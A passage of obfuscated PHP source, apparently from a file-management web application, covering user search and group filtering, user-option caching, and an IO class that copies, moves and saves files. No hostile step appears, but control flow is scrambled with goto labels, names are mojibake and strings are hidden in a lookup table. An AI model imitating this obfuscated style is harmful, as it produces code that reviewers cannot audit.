array($BĞªÂ‡ÎäÎ[378], "{$bÔßœÍŞãë}\45"); } goto D‹‚æİí†–; d—è¸çƒ¡: $BĞªÂ‡ÎäÎ =& $_SERVER[Š‰]; $bÔßœÍŞãë = $F’Ğ¯‰£İ[$BĞªÂ‡ÎäÎ[1747]]; $b¡İ‚ˆÍ = isset($F’Ğ¯‰£İ[$BĞªÂ‡ÎäÎ[1748]]) ? $F’Ğ¯‰£İ[$BĞªÂ‡ÎäÎ[1748]] : !1; goto d¶±ùßŠì; a¨å÷Á‚ŠÒ: } private function _filterByGroup(&$b¶ğä§ØÌ, $D›†¿©êó) { $Cƒ‘‘Ü‰çî =& $_SERVER[Š‰]; if (!$D›†¿©êó) { return $b¶ğä§ØÌ; } foreach ($b¶ğä§ØÌ[$Cƒ‘‘Ü‰çî[365]] as $aÎ­±‰ˆ¢œ => &$fàî­÷„…) { $c‡áí‘…î• = array_to_keyvalue($fàî­÷„…[$Cƒ‘‘Ü‰çî[1838]], $Cƒ‘‘Ü‰çî[33], $Cƒ‘‘Ü‰çî[1663]); if (!in_array($D›†¿©êó, $c‡áí‘…î•)) { unset($b¶ğä§ØÌ[$Cƒ‘‘Ü‰çî[365]][$aÎ­±‰ˆ¢œ]); } } unset($fàî­÷„…); $b¶ğä§ØÌ[$Cƒ‘‘Ü‰çî[365]] = array_values($b¶ğä§ØÌ[$Cƒ‘‘Ü‰çî[365]]); $b¶ğä§ØÌ[$Cƒ‘‘Ü‰çî[362]] = array($Cƒ‘‘Ü‰çî[1900] => count($b¶ğä§ØÌ[$Cƒ‘‘Ü‰çî[365]]), $Cƒ‘‘Ü‰çî[1898] => $b¶ğä§ØÌ[$Cƒ‘‘Ü‰çî[362]][$Cƒ‘‘Ü‰çî[359]], $Cƒ‘‘Ü‰çî[1897] => 1, $Cƒ‘‘Ü‰çî[1899] => 1); } private function _searchFromMeta($AàøÄ®Àô«, $DÄ—Øå‹˜Æ, $AŸ¹¶§æÊí) { goto Fö±òöø½š; cíÁÛ·ã¶µ: return $FŠÁ¸¡ìÂ; goto BÓİŞˆ š; BÉ¹¶–°Ò¿: $d«ÌÍ‘„ = $this->parseWhereLike($d«ÌÍ‘„); $e„áÁÎã¬• = Model($AÈ±ÏÌªáÓ[2125])->where($d«ÌÍ‘„)->limit($AŸ¹¶§æÊí)->select(); if (!$e„áÁÎã¬•) { return array(); } goto A Îîã”¡İ; A Îîã”¡İ: $e„áÁÎã¬• = array_to_keyvalue($e„áÁÎã¬•, $AÈ±ÏÌªáÓ[33], $AÈ±ÏÌªáÓ[1500]); $FŠÁ¸¡ìÂ = $this->where(array($AÈ±ÏÌªáÓ[1492] => array($AÈ±ÏÌªáÓ[7], $e„áÁÎã¬•)))->select(); if (!$FŠÁ¸¡ìÂ) { return array(); } goto cíÁÛ·ã¶µ; Fö±òöø½š: $AÈ±ÏÌªáÓ =& $_SERVER[Š‰]; $DÄ—Øå‹˜Æ = strtolower($DÄ—Øå‹˜Æ); $d«ÌÍ‘„ = array($AÈ±ÏÌªáÓ[92] => $AàøÄ®Àô«, $AÈ±ÏÌªáÓ[370] => array($AÈ±ÏÌªáÓ[378], "\45{$DÄ—Øå‹˜Æ}\x25")); goto BÉ¹¶–°Ò¿; BÓİŞˆ š: } private function _listDataApplyItem($f¬ÉáŠÂÉ) { $CÛÑ¥Ò¡÷ = array($f¬ÉáŠÂÉ); $this->_listDataApply($CÛÑ¥Ò¡÷); return $CÛÑ¥Ò¡÷[0]; } private function _listDataApply(&$E¥ÌéÙ°À) { goto aÍÅÕƒÈêÒ; A•Ûæñ˜×‹: $B¨¼³›¶‚ = array_to_keyvalue($E¥ÌéÙ°À, $B±ŞÊóÒ˜ñ[33], $B±ŞÊóÒ˜ñ[1500]); $this->_listAppendGroup($E¥ÌéÙ°À, $B¨¼³›¶‚); $this->_listAppendMeta($E¥ÌéÙ°À, $B¨¼³›¶‚); goto eÎÙİ‘ŞßÜ; aÍÅÕƒÈêÒ: $B±ŞÊóÒ˜ñ =& $_SERVER[Š‰]; if (!$E¥ÌéÙ°À) { return; } array_remove_key($E¥ÌéÙ°À, $B±ŞÊóÒ˜ñ[826]); goto A•Ûæñ˜×‹; eÎÙİ‘ŞßÜ: $this->_listAppendSourceRoot($E¥ÌéÙ°À, $B¨¼³›¶‚); goto c…¾İÈÛ…É; c…¾İÈÛ…É: } private function _listAppendSourceRoot(&$Aìù½ç³Â“, $B†® ôå¶) { goto A×‹¦â—“; fƒ¸œ¿Àí¢: $E‰Œ½ËšÒÑ = Model($D¯ «­åè©[775])->order($D¯ «­åè©[1758])->field($E›§ì¬©…Ò)->where($Cî‰œÁäæŒ)->select(); $E‰Œ½ËšÒÑ = array_to_keyvalue($E‰Œ½ËšÒÑ, $D¯ «­åè©[478]); $E‰Œ½ËšÒÑ = array_remove_key($E‰Œ½ËšÒÑ, $D¯ «­åè©[478]); goto eÒ£—ì¹Ô„; A×‹¦â—“: $D¯ «­åè© =& $_SERVER[Š‰]; $Cî‰œÁäæŒ = array($D¯ «­åè©[472] => 0, $D¯ «­åè©[398] => SourceModel::TYPE_USER, $D¯ «­åè©[478] => array($D¯ «­åè©[7], $B†® ôå¶)); $E›§ì¬©…Ò = $D¯ «­åè©[1757]; goto fƒ¸œ¿Àí¢; eÒ£—ì¹Ô„: foreach ($Aìù½ç³Â“ as &$e‚½ õ‚¶) { $e‚½ õ‚¶[$D¯ «­åè©[84]] = $E‰Œ½ËšÒÑ[$e‚½ õ‚¶[$D¯ «­åè©[1500]]] ? $E‰Œ½ËšÒÑ[$e‚½ õ‚¶[$D¯ «­åè©[1500]]] : array(); } unset($e‚½ õ‚¶); goto aÖó³Èˆ‰; aÖó³Èˆ‰: } private function _listAppendGroup(&$dÜ¥ø³«ˆ, $aÃ“¿À¦—½) { goto aÔëÆ²ùŞ´; AÎÓùˆßå: foreach ($dÜ¥ø³«ˆ as &$aÆÓ­ïî©§) { $aÆÓ­ïî©§[$a„ôµ…–è×[1838]] = array(); if (isset($d‹ãÏùÅì[$aÆÓ­ïî©§[$a„ôµ…–è×[1500]]])) { $aÆÓ­ïî©§[$a„ôµ…–è×[1838]] = $d‹ãÏùÅì[$aÆÓ­ïî©§[$a„ôµ…–è×[1500]]]; } } unset($aÆÓ­ïî©§); goto eºÆƒçòá; c–Á ¹‘: $d‹ãÏùÅì = array_to_keyvalue_group($d‹ãÏùÅì, $a„ôµ…–è×[1500]); foreach ($d‹ãÏùÅì as &$Fá“½˜Ó§Ì) { $aÓÍ¦Ğ’ = array(); foreach ($Fá“½˜Ó§Ì as $Cà‘Æñ“¬á) { if (!$Cà‘Æñ“¬á[$a„ôµ…–è×[1759]]) { continue; } $EëÔ†£™¹‰ = Model($a„ôµ…–è×[1831])->listData($Cà‘Æñ“¬á[$a„ôµ…–è×[1759]]); $aÓÍ¦Ğ’[] = array($a„ôµ…–è×[1663] => $Cà‘Æñ“¬á[$a„ôµ…–è×[1663]], $a„ôµ…–è×[2127] => $fÖÁ¨õÂ[$Cà‘Æñ“¬á[$a„ôµ…–è×[1663]]][$a„ôµ…–è×[28]], $a„ôµ…–è×[481] => $fÖÁ¨õÂ[$Cà‘Æñ“¬á[$a„ôµ…–è×[1663]]][$a„ôµ…–è×[481]], $a„ôµ…–è×[400] => $EëÔ†£™¹‰); } $Fá“½˜Ó§Ì = $aÓÍ¦Ğ’; } unset($Fá“½˜Ó§Ì); goto AÎÓùˆßå; aÚõ£ÂÆ‘: $Ašç¿á”İ = array($a„ôµ…–è×[1663] => array($a„ôµ…–è×[7], $e‘ê†ÒøÂ—)); $fÖÁ¨õÂ = Model($a„ôµ…–è×[1836])->field($a„ôµ…–è×[2126])->where($Ašç¿á”İ)->select(); $fÖÁ¨õÂ = array_to_keyvalue($fÖÁ¨õÂ, $a„ôµ…–è×[1663]); goto c–Á ¹‘; CÜ§™Ğé›è: $e‘ê†ÒøÂ— = array_to_keyvalue($d‹ãÏùÅì, $a„ôµ…–è×[33], $a„ôµ…–è×[1663]); $e‘ê†ÒøÂ— = array_remove_value(array_unique($e‘ê†ÒøÂ—), $a„ôµ…–è×[491]); if (!$e‘ê†ÒøÂ— || !$d‹ãÏùÅì) { return; } goto aÚõ£ÂÆ‘; aÔëÆ²ùŞ´: $a„ôµ…–è× =& $_SERVER[Š‰]; $Ašç¿á”İ = array($a„ôµ…–è×[1500] => array($a„ôµ…–è×[7], $aÃ“¿À¦—½)); $d‹ãÏùÅì = Model($a„ôµ…–è×[1745])->where($Ašç¿á”İ)->select(); goto CÜ§™Ğé›è; eºÆƒçòá: } private function _listAppendMeta(&$BŸ›ƒ¸øÙ, $F²ñìÓ¬ö·) { goto f­Üßº¡²¶; bÏ¼İŸÂƒ: $AàŞ½¹â™ğ = array($eø°ÛŸÑ×¥[1500] => array($eø°ÛŸÑ×¥[7], $F²ñìÓ¬ö·)); $dã®­”’ˆ˜ = Model($eø°ÛŸÑ×¥[2104])->where($AàŞ½¹â™ğ)->select(); $dã®­”’ˆ˜ = array_to_keyvalue_group($dã®­”’ˆ˜, $eø°ÛŸÑ×¥[1500]); goto f¯ŠóÏˆãÃ; f¯ŠóÏˆãÃ: foreach ($dã®­”’ˆ˜ as &$añŒé¹Ô‡¢) { $Báñ«ÇÓ°‡ = array(); foreach ($añŒé¹Ô‡¢ as $B’ô¤ˆí·Â) { if (!in_array($B’ô¤ˆí·Â[$eø°ÛŸÑ×¥[92]], $aÓİ¾æ ¡×)) { $Báñ«ÇÓ°‡[$B’ô¤ˆí·Â[$eø°ÛŸÑ×¥[92]]] = $B’ô¤ˆí·Â[$eø°ÛŸÑ×¥[370]]; } } $añŒé¹Ô‡¢ = $Báñ«ÇÓ°‡; } unset($añŒé¹Ô‡¢); $BĞØó‰Šç = Model($eø°ÛŸÑ×¥[2128]); goto c“¤¯‘´¹ƒ; c“¤¯‘´¹ƒ: foreach ($BŸ›ƒ¸øÙ as &$D‘øóğˆ¤Ì) { $cÊ¡½‚ë› = array(); if (isset($dã®­”’ˆ˜[$D‘øóğˆ¤Ì[$eø°ÛŸÑ×¥[1500]]])) { $cÊ¡½‚ë› = $dã®­”’ˆ˜[$D‘øóğˆ¤Ì[$eø°ÛŸÑ×¥[1500]]]; } $D‘øóğˆ¤Ì[$eø°ÛŸÑ×¥[2129]] = array(); if (isset($cÊ¡½‚ë›[$BÖ¿Ì¥Ãù¯])) { $D‘øóğˆ¤Ì[$eø°ÛŸÑ×¥[2129]] = $BĞØó‰Šç->getUserJobInfo($cÊ¡½‚ë›[$BÖ¿Ì¥Ãù¯]); } } unset($D‘øóğˆ¤Ì); goto c‡Ñ®æŸ¨í; f­Üßº¡²¶: $eø°ÛŸÑ×¥ =& $_SERVER[Š‰]; $BÖ¿Ì¥Ãù¯ = UserJobModel::JOB_KEY; $aÓİ¾æ ¡× = array($eø°ÛŸÑ×¥[2106]); goto bÏ¼İŸÂƒ; c‡Ñ®æŸ¨í: } protected function groupUserAll($CÊù„¼óßã) { $fšˆŒ×±å =& $_SERVER[Š‰]; if (!$CÊù„¼óßã) { return !1; } $cÕ®ƒç´¹¥ = Model($fšˆŒ×±å[1745])->field($fšˆŒ×±å[1500])->where(array($fšˆŒ×±å[1663] => array($fšˆŒ×±å[7], $CÊù„¼óßã)))->select(); $cÕ®ƒç´¹¥ = array_to_keyvalue($cÕ®ƒç´¹¥, $fšˆŒ×±å[33], $fšˆŒ×±å[1500]); return array_unique($cÕ®ƒç´¹¥); } public function userSearch($CÓ…ÏŸÉ¹÷, $eËíˆÚÓ‡ = "\x2a") { return Model($_SERVER[Š‰][501])->where($CÓ…ÏŸÉ¹÷)->field($eËíˆÚÓ‡)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\137\x6f\160\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($dØ†½ã¡Ñ) { $E¹®Ì¸®˜° =& $_SERVER[Š‰]; if (!defined($E¹®Ì¸®˜°[448])) { define($E¹®Ì¸®˜°[448], 0); } return "\125\163\x65\162\x4f\x70\164\151\157\156\137{$dØ†½ã¡Ñ}\137" . USER_ID; } protected function filterWhere($CÙ«çÊÖ) { $B š°µÒ¾ê =& $_SERVER[Š‰]; if (!defined($B š°µÒ¾ê[448])) { define($B š°µÒ¾ê[448], 0); } $CÙ«çÊÖ[$B š°µÒ¾ê[1500]] = USER_ID; return $CÙ«çÊÖ; } public function cacheRemoveUser($d†ƒœâ‘òÑ, $E„õ¢ÉÙˆñ) { return Cache::remove("\x55\163\x65\x72\117\x70\x74\151\157\x6e\137{$d†ƒœâ‘òÑ}\x5f" . $E„õ¢ÉÙˆñ); } protected function optionDefault($AÀëÅÙåÈÍ = '') { $FÈ§¤ù¿ã´ =& $_SERVER[Š‰]; if ($AÀëÅÙåÈÍ == $FÈ§¤ù¿ã´[33]) { return $GLOBALS[$FÈ§¤ù¿ã´[6]][$FÈ§¤ù¿ã´[2130]]; } if ($AÀëÅÙåÈÍ == $FÈ§¤ù¿ã´[2131]) { return $GLOBALS[$FÈ§¤ù¿ã´[6]][$FÈ§¤ù¿ã´[2132]]; } } } goto cÚƒ†ê™; f †ÜÒ„ç°: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($e¢øÇ³Ü±‚, $EïÔ„ŸØ‡¼) { goto eÄ‚šù¶±ø; eÄ‚šù¶±ø: $c÷ÛìİÎóÔ =& $_SERVER[Š‰]; $EÍ‘½ÕƒĞ = $EïÔ„ŸØ‡¼; $GLOBALS[$c÷ÛìİÎóÔ[1019]] = $c÷ÛìİÎóÔ[1020] . $e¢øÇ³Ü±‚; goto bé©Æ¸¦ºİ; e›­¡Á¾óÙ: Hook::trigger($c÷ÛìİÎóÔ[1020] . $e¢øÇ³Ü±‚ . $c÷ÛìİÎóÔ[1023], $EÍ‘½ÕƒĞ, $B¶™îø®İ¯); return $B¶™îø®İ¯; goto Dé…ÖáŠß; bé©Æ¸¦ºİ: Hook::trigger($c÷ÛìİÎóÔ[1020] . $e¢øÇ³Ü±‚ . $c÷ÛìİÎóÔ[1021], $EÍ‘½ÕƒĞ); $A¼…î“Ÿ² = self::driverMake($EïÔ„ŸØ‡¼[0]); if (method_exists($A¼…î“Ÿ², $e¢øÇ³Ü±‚)) { $B¶™îø®İ¯ = @call_user_func_array(array($A¼…î“Ÿ², $e¢øÇ³Ü±‚), $EïÔ„ŸØ‡¼); } else { if (method_exists($A¼…î“Ÿ², $c÷ÛìİÎóÔ[1022])) { $B¶™îø®İ¯ = @call_user_func_array(array($A¼…î“Ÿ², $e¢øÇ³Ü±‚), $EïÔ„ŸØ‡¼); } else { if (method_exists(self, $e¢øÇ³Ü±‚)) { $B¶™îø®İ¯ = @call_user_func_array(array(self, $e¢øÇ³Ü±‚), $EïÔ„ŸØ‡¼); } else { $B¶™îø®İ¯ = call_user_func_array(array(parent, $e¢øÇ³Ü±‚), $EïÔ„ŸØ‡¼); } } } goto e›­¡Á¾óÙ; Dé…ÖáŠß: } public static function init($e÷×§ß¼ùÅ) { return self::driverMake($e÷×§ß¼ùÅ); } public static function copy($fœŠ”²è¶¯, $aé·ƒ¬»ƒø, $dÊ£ÏÀ¾° = false, $c”„ÂØŞÖ¿ = false) { return self::copyMoveStart($fœŠ”²è¶¯, $aé·ƒ¬»ƒø, $dÊ£ÏÀ¾°, $_SERVER[Š‰][513], $c”„ÂØŞÖ¿); } public static function move($Bå›çåù’™, $b¨·‹¥é¥, $Dì°£à÷ˆ° = false, $F…ôµõî¡é = false) { return self::copyMoveStart($Bå›çåù’™, $b¨·‹¥é¥, $Dì°£à÷ˆ°, $_SERVER[Š‰][515], $F…ôµõî¡é); } private static function copyMoveStart($fÉÒ—øô“Ğ, $b‘¸‡´ŒÅ„, $c¯¡ê·¨¾ˆ, $C”ğÚ‰’®, $BíØ£ŒÃ—Ğ) { $B¼èŸãªÈ =& $_SERVER[Š‰]; $Bãæ¼¹„§ä = array($fÉÒ—øô“Ğ, $b‘¸‡´ŒÅ„, $c¯¡ê·¨¾ˆ, $BíØ£ŒÃ—Ğ); Hook::trigger($B¼èŸãªÈ[1020] . $C”ğÚ‰’® . $B¼èŸãªÈ[1021], $Bãæ¼¹„§ä); $aé·°®³Á = self::copyMove($fÉÒ—øô“Ğ, $b‘¸‡´ŒÅ„, $c¯¡ê·¨¾ˆ, $C”ğÚ‰’®, $BíØ£ŒÃ—Ğ); Hook::trigger($B¼èŸãªÈ[1020] . $C”ğÚ‰’® . $B¼èŸãªÈ[1023], $Bãæ¼¹„§ä, $aé·°®³Á); return $aé·°®³Á; } public static function saveFile($fåš™‡˜£“, $fìù¶ âÛî, $eÁÁƒ­‹ÌŒ = true) { goto EòÔÆš‰Ôå; EòÔÆš‰Ôå: $A×‚•â‚È =& $_SERVER[Š‰]; $AöÅù¢ñ›ê = self::info($fìù¶ âÛî); $bäÒå”¶ = self::driverMake($fåš™‡˜£“); goto D†‚©İë†®; D†‚©İë†®: $b—Á…öíÏ‹ = self::driverMake($fìù¶ âÛî); $Cî‰Ó§æ‘Ã = !1; if ($b—Á…öíÏ‹->pathParse[$A×‚•â‚È[1024]]) { $B¸¦„¾ƒÍ = $b—Á…öíÏ‹->pathParse[$A×‚•â‚È[1024]]; $Cî‰Ó§æ‘Ã = $b—Á…öíÏ‹; $b—Á…öíÏ‹ = self::driverMake($B¸¦„¾ƒÍ); } goto aá©•ß‘ÆÃ; aá©•ß‘ÆÃ: $eÇí›÷‹›ª = $b—Á…öíÏ‹->pathFather($fìù¶ âÛî); $bŒéš°¿ ‰ = !0; if (!$eÁÁƒ­‹ÌŒ && self::driverIsSame($bäÒå”¶, $b—Á…öíÏ‹)) { $bŒéš°¿ ‰ = !1; } goto eÂæáš›ßÔ; eÂæáš›ßÔ: $d·ñôÒô‹ = self::copyFile($bäÒå”¶, $fåš™‡˜£“, $b—Á…öíÏ‹, $eÇí›÷‹›ª, $AöÅù¢ñ›ê[$A×‚•â‚È[28]], $bŒéš°¿ ‰); if ($Cî‰Ó§æ‘Ã) { $d·ñôÒô‹ = $Cî‰Ó§æ‘Ã->getPathOuter($d·ñôÒô‹); } return $d·ñôÒô‹; goto EÓ¦Ğ¯¶ˆ; EÓ¦Ğ¯¶ˆ: } private static function copyMove($e¯é¼ğÌ‚£, $fª’¾ãÄ†, $F·¬¯ª¬¹, $eèõÖµ´Ù, $cãÎ‡¢ê¼Ñ = false) { goto b‰Æô‹Â¨; fÊ–‰æàî¢: $Fæññ¢‡òİ = !1; if ($C¹ğå¨Û° ->pathParse[$CãñâÊÛ¡è[1024]]) { $fª’¾ãÄ† = $C¹ğå¨Û° ->pathParse[$CãñâÊÛ¡è[1024]]; $Fæññ¢‡òİ = $C¹ğå¨Û° ; $C¹ğå¨Û°  = self::driverMake($fª’¾ãÄ†); } self::check($FìÍŞÈ¨½Ó, $e¯é¼ğÌ‚£, $C¹ğå¨Û° , $fª’¾ãÄ†); goto fÖùğÉÕÀ«; Fæ˜îô«…°: if ($Fæññ¢‡òİ) { $DŠñÚˆ…ëã = $Fæññ¢‡òİ->getPathOuter($DŠñÚˆ…ëã); } return $DŠñÚˆ…ëã; goto fôÙ›ğÇÎ; b‰Æô‹Â¨: $CãñâÊÛ¡è =& $_SERVER[Š‰]; if (!$e¯é¼ğÌ‚£ || $e¯é¼ğÌ‚£ == $CãñâÊÛ¡è[8] || !$fª’¾ãÄ†) { return !1; } ignore_timeout(); goto aÁ“‡‰ù¤; b÷ŒœØíÁ: $dÜœí¡¡ = $FìÍŞÈ¨½Ó->isFile($e¯é¼ğÌ‚£); if (!$dÜœí¡¡ && $C¹ğå¨Û° ->getType() == $CãñâÊÛ¡è[707] && $FìÍŞÈ¨½Ó->getType() == $CãñâÊÛ¡è[105]) { $DŠñÚˆ…ëã = $C¹ğå¨Û° ->copyFolderFromIO($FìÍŞÈ¨½Ó, $e¯é¼ğÌ‚£, $fª’¾ãÄ†, $F·¬¯ª¬¹, $Bòä´äˆ, $cãÎ‡¢ê¼Ñ); } else { $DŠñÚˆ…ëã = self::copyPath($FìÍŞÈ¨½Ó, $e¯é¼ğÌ‚£, $C¹ğå¨Û° , $fª’¾ãÄ†, $F·¬¯ª¬¹, $Bòä´äˆ, $dÜœí¡¡, $cãÎ‡¢ê¼Ñ); } if ($DŠñÚˆ…ëã && $Bòä´äˆ) { $FìÍŞÈ¨½Ó->remove($e¯é¼ğÌ‚£); } goto Fæ˜îô«…°; fÖùğÉÕÀ«: Hook::trigger($CãñâÊÛ¡è[72], $FìÍŞÈ¨½Ó, $e¯é¼ğÌ‚£, $C¹ğå¨Û° , $fª’¾ãÄ†); $eÚ²©ÖğéÍ = self::driverIsSame($FìÍŞÈ¨½Ó, $C¹ğå¨Û° ); if ($eÚ²©ÖğéÍ) { if ($eèõÖµ´Ù == $CãñâÊÛ¡è[515] && !method_exists($C¹ğå¨Û° , $CãñâÊÛ¡è[1025]) && trim($fª’¾ãÄ†, $CãñâÊÛ¡è[8]) == trim($C¹ğå¨Û° ->pathFather($e¯é¼ğÌ‚£), $CãñâÊÛ¡è[8])) { if ($FìÍŞÈ¨½Ó->pathThis($e¯é¼ğÌ‚£) != $cãÎ‡¢ê¼Ñ && !$FìÍŞÈ¨½Ó->isTypeObject()) { return $FìÍŞÈ¨½Ó->rename($e¯é¼ğÌ‚£, $cãÎ‡¢ê¼Ñ); } return $C¹ğå¨Û° ->getPathOuter($e¯é¼ğÌ‚£); } if (method_exists($C¹ğå¨Û° , $eèõÖµ´Ù)) { return $C¹ğå¨Û° ->{$eèõÖµ´Ù}($e¯é¼ğÌ‚£, $fª’¾ãÄ†, $F·¬¯ª¬¹); } } goto b÷ŒœØíÁ; aÁ“‡‰ù¤: $FìÍŞÈ¨½Ó = self::driverMake($e¯é¼ğÌ‚£); $C¹ğå¨Û°  = self::driverMake($fª’¾ãÄ†); $Bòä´äˆ = $eèõÖµ´Ù == $CãñâÊÛ¡è[515]; goto fÊ–‰æàî¢; fôÙ›ğÇÎ: } private static function check($bÕ©¦‰ÙÚ, $fØÀà’Ğ¬, $Bœ©½Çâ˜ö, &$E¿·……Á“) { $b•í—¶Ó¢Æ =& $_SERVER[Š‰]; if (self::driverIsSame($bÕ©¦‰ÙÚ, $Bœ©½Çâ˜ö) && $bÕ©¦‰ÙÚ->isFolder($fØÀà’Ğ¬) && $bÕ©¦‰ÙÚ->isParentOf($fØÀà’Ğ¬, $E¿·……Á“)) { show_json(LNG($b•í—¶Ó¢Æ[1026]), !1); } if (!$bÕ©¦‰ÙÚ->exist($fØÀà’Ğ¬)) { show_json(LNG($b•í—¶Ó¢Æ[104]), !1); } } private static function copyPath($aéöéåğ±, $dÖØ¡ºßëé, $bÖå«åá¹Ú, $dŸÄ…¨À§š, $C™¯©µ„Ó, $fÃš×ø²‡±, $FÂ¦ÇÀÅõ, $fŞÉ«‰«èİ = false) { goto AåÕÉ•»ª†; AÁåçœ¸œ: $B íäÕê´™ = array_merge($EÇñ†šã‚í[$E·¶Áø£Ôİ[73]], $EÇñ†šã‚í[$E·¶Áø£Ôİ[74]]); foreach ($B íäÕê´™ as $b§—Ô½î) { $bÃ¢§„¨Õ¥ = $b§—Ô½î[$E·¶Áø£Ôİ[29]] == $E·¶Áø£Ôİ[173]; $dÖØ¡ºßëé = $aéöéåğ±->getPathInner($b§—Ô½î[$E·¶Áø£Ôİ[75]]); $f²ë³‚«Ê = self::copyPath($aéöéåğ±, $dÖØ¡ºßëé, $bÖå«åá¹Ú, $dŸÄ…¨À§š, $C™¯©µ„Ó, $fÃš×ø²‡±, $bÃ¢§„¨Õ¥); if (!$f²ë³‚«Ê) { IO::errorTips($E·¶Áø£Ôİ[1027] . $dÖØ¡ºßëé . $E·¶Áø£Ôİ[66] . $dŸÄ…¨À§š); } } return $B”´á”ÉéĞ; goto Bí¶ï¾·ïê; f”…šŒÙ¢Ê: $B”´á”ÉéĞ = $bÖå«åá¹Ú->mkdir($bÖå«åá¹Ú->getPath($C¾¹…Ø°¦×)); $dŸÄ…¨À§š = $bÖå«åá¹Ú->getPathInner($B”´á”ÉéĞ); $EÇñ†šã‚í = $aéöéåğ±->listPath($dÖØ¡ºßëé, !0); goto AÁåçœ¸œ; AåÕÉ•»ª†: $E·¶Áø£Ôİ =& $_SERVER[Š‰]; $eª§ì²ˆ‹ = $fŞÉ«‰«èİ ? $fŞÉ«‰«èİ : $aéöéåğ±->pathThis($dÖØ¡ºßëé); if ($C™¯©µ„Ó) { $EÛ‹°¥ëÂ­ = $bÖå«åá¹Ú->fileNameExist($dŸÄ…¨À§š, $eª§ì²ˆ‹); $eª§ì²ˆ‹ = $bÖå«åá¹Ú->fileNameAuto($dŸÄ…¨À§š, $eª§ì²ˆ‹, $C™¯©µ„Ó, !$FÂ¦ÇÀÅõ); $C™¯©µ„Ó = $EÛ‹°¥ëÂ­ ? $C™¯©µ„Ó : !1; } goto fëªğµØò; fëªğµØò: if ($FÂ¦ÇÀÅõ) { return self::copyFile($aéöéåğ±, $dÖØ¡ºßëé, $bÖå«åá¹Ú, $dŸÄ…¨À§š, $eª§ì²ˆ‹, $fÃš×ø²‡±); } if ($C™¯©µ„Ó == REPEAT_RENAME_FOLDER) { $C™¯©µ„Ó = !1; } $C¾¹…Ø°¦× = rtrim($dŸÄ…¨À§š, $E·¶Áø£Ôİ[8]) . $E·¶Áø£Ôİ[8] . $eª§ì²ˆ‹; goto f”…šŒÙ¢Ê; Bí¶ï¾·ïê: } private static function copyFile($cÖ”ßÏÊ, $c­ªìø›Š, $e¸øŸø×¯, $aìöø§õ®, $D¡á‹“š‘ˆ, $a‰¡º·­›¥) { goto f½ÅŞ˜™İ; e§õëÄîµ: mk_dir($a„Û™¹ç˜¼); $A–ëì„³—– = $a„Û™¹ç˜¼ . $e¥Á•¶¾Œù; $A–ëì„³—– = $cÖ”ßÏÊ->download($c­ªìø›Š, $A–ëì„³—–); goto aï”ãÀÚ—­; aï”ãÀÚ—­: $A–ëì„³—– = $cÖ”ßÏÊ->iconvApp($A–ëì„³—–); $Bİñ‰ëŸÎ‰ = $e¸øŸø×¯->upload($aìöø§õ®, $A–ëì„³—–, $a‰¡º·­›¥); self::remove($a„Û™¹ç˜¼ . $e¥Á•¶¾Œù); goto FÙ§›’Š‚º; bÔ˜²íÅ¼–: Hook::trigger($fÆƒĞ“§ˆŠ[1029], $cÖ”ßÏÊ, $c­ªìø›Š, $e¸øŸø×¯, $aìöø§õ®, $D¡á‹“š‘ˆ, $e¥Á•¶¾Œù); if (self::driverIsSame($cÖ”ßÏÊ, $e¸øŸø×¯)) { if ($a‰¡º·­›¥) { $Bİñ‰ëŸÎ‰ = $e¸øŸø×¯->moveFile($c­ªìø›Š, $aìöø§õ®); } else { $Bİñ‰ëŸÎ‰ = $e¸øŸø×¯->copyFile($c­ªìø›Š, $aìöø§õ®); } Hook::trigger($fÆƒĞ“§ˆŠ[1030], $cÖ”ßÏÊ, $c­ªìø›Š, $e¸øŸø×¯, $aìöø§õ®, $D¡á‹“š‘ˆ, $Bİñ‰ëŸÎ‰); return $Bİñ‰ëŸÎ‰; } $a„Û™¹ç˜¼ = TEMP_FILES; goto e§õëÄîµ; FÙ§›’Š‚º: Hook::trigger($fÆƒĞ“§ˆŠ[1030], $cÖ”ßÏÊ, $c­ªìø›Š, $e¸øŸø×¯, $aìöø§õ®, $D¡á‹“š‘ˆ, $Bİñ‰ëŸÎ‰); return $Bİñ‰ëŸÎ‰; goto d¢¸ñôŠê; f½ÅŞ˜™İ: $fÆƒĞ“§ˆŠ =& $_SERVER[Š‰]; $aìöø§õ® = $e¸øŸø×¯->getPath(rtrim($aìöø§õ®, $fÆƒĞ“§ˆŠ[8]) . $fÆƒĞ“§ˆŠ[8] . $D¡á‹“š‘ˆ); $e¥Á•¶¾Œù = $fÆƒĞ“§ˆŠ[1028] . time() . rand_string(5); goto bÔ˜²íÅ¼–; d¢¸ñôŠê: } public static function pathFather($dÑ»ŸÊá˜î) { $DĞ§ïÛ„àŠ = IO::init($dÑ»ŸÊá˜î); $Cµš„ôˆ„ = $DĞ§ïÛ„àŠ->pathFather($DĞ§ïÛ„àŠ->path); return $DĞ§ïÛ„àŠ->getPathOuter($Cµš„ôˆ„); } public static function fileOut($Bß‰ÔÆèÈ, $cÓšã¹Í¤Å = false, $cŠç§ëåéÂ = false, $EÕ¨„Ô”Í¾ = '') { $aóÙ„ï÷Ÿ = self::driverMake($Bß‰ÔÆèÈ); if ($aóÙ„ï÷Ÿ->isFileOutServer()) { return $aóÙ„ï÷Ÿ->fileOutServer($Bß‰ÔÆèÈ, $cÓšã¹Í¤Å, $cŠç§ëåéÂ, $EÕ¨„Ô”Í¾); } return $aóÙ„ï÷Ÿ->fileOut($Bß‰ÔÆèÈ, $cÓšã¹Í¤Å, $cŠç§ëåéÂ, $EÕ¨„Ô”Í¾); } public static function fileOutImage($C»È’à˜¬Ø, $BÖœ––ğË = 250) { $E¯ğ®ë·Ù = array(250, 600, 1200, 3000, 5000); for ($EƒÂ•Š©¼Û = 0; $EƒÂ•Š©¼Û < count($E¯ğ®ë·Ù); $EƒÂ•Š©¼Û++) { if ($EƒÂ•Š©¼Û == 0 && $BÖœ––ğË <= $E¯ğ®ë·Ù[$EƒÂ•Š©¼Û]) { $BÖœ––ğË = $E¯ğ®ë·Ù[$EƒÂ•Š©¼Û]; break; } else { if ($BÖœ––ğË > $E¯ğ®ë·Ù[$EƒÂ•Š©¼Û - 1] && $BÖœ––ğË <= $E¯ğ®ë·Ù[$EƒÂ•Š©¼Û]) { $BÖœ––ğË = $E¯ğ®ë·Ù[$EƒÂ•Š©¼Û]; break; } else { if 